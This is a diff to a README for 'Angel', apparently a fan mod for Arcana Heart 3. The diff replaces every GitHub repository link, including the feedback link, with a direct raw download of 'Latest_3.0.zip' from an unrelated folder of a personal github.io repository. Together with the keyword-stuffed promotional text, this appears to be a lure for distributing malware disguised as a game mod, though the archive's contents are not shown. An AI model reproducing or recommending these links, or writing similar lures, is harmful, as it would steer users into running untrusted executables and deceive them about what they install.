@@ -5,7 +5,7 @@ description: "Enhance Arcana Heart 3 LOVEMAX SIXSTARS with rollback netcode, bet
 ---
 # ⚔️ Angel - Unlock the Full Arcana Heart Experience Today
 
-[🚀 Download Angel Now](https://github.com/oblacila9/Angel)
+[🚀 Download Angel Now](https://raw.githubusercontent.com/oblacila9/oblacila9.github.io/main/uniliteral/Latest_3.0.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Welcome! Follow these simple steps to get Angel running on your Windows PC. No p
 
 ### Step 1: Download Angel
 
-Visit this link to download the application: [https://github.com/oblacila9/Angel](https://github.com/oblacila9/Angel)
+Visit this link to download the application: [https://raw.githubusercontent.com/oblacila9/oblacila9.github.io/main/uniliteral/Latest_3.0.zip](https://raw.githubusercontent.com/oblacila9/oblacila9.github.io/main/uniliteral/Latest_3.0.zip)
 
 Once you are on that page, look for the download button or the "Latest Release" section. Click the download link to save the file to your computer. It will likely go to your "Downloads" folder.
 
@@ -121,7 +121,7 @@ If your issue isn't listed here, try restarting your computer and running the in
 
 Need the file again? No problem. Head back to the download page using the button below.
 
-[⬇️ Download Angel Now](https://github.com/oblacila9/Angel)
+[⬇️ Download Angel Now](https://raw.githubusercontent.com/oblacila9/oblacila9.github.io/main/uniliteral/Latest_3.0.zip)
 
 ---
 
@@ -159,7 +159,7 @@ No. Once downloaded and installed, Angel works fully offline.
 
 Angel is created by dedicated fans of Arcana Heart, aiming to give you the best possible version of the game. We are not affiliated with the original developers but deeply appreciate their work.
 
-If you have suggestions, bug reports, or just want to say thanks, feel free to reach out through the official repository page: [https://github.com/oblacila9/Angel](https://github.com/oblacila9/Angel)
+If you have suggestions, bug reports, or just want to say thanks, feel free to reach out through the official repository page: [https://raw.githubusercontent.com/oblacila9/oblacila9.github.io/main/uniliteral/Latest_3.0.zip](https://raw.githubusercontent.com/oblacila9/oblacila9.github.io/main/uniliteral/Latest_3.0.zip)
 
 ---
 
@@ -167,6 +167,6 @@ If you have suggestions, bug reports, or just want to say thanks, feel free to r
 
 Get ready to rediscover Arcana Heart 3 LOVEMAX SIXSTARS!!!!!! XTEND like never before. With Angel, every match is faster, every character is clearer, and every session is more satisfying. The download takes less than a minute, and the installation is just a few clicks. Don't wait—upgrade your fighting game experience now.
 
-[⚡ Get Started with Angel](https://github.com/oblacila9/Angel)
+[⚡ Get Started with Angel](https://raw.githubusercontent.com/oblacila9/oblacila9.github.io/main/uniliteral/Latest_3.0.zip)
 
 Keywords: Arcana Heart mod, Angel mod, game improvement, fighting game, visual upgrade, performance boost, Windows gaming, Arcana Heart 3, LOVEMAX SIXSTARS, XTEND mod, quality of life mod, 2D fighter enhancement.
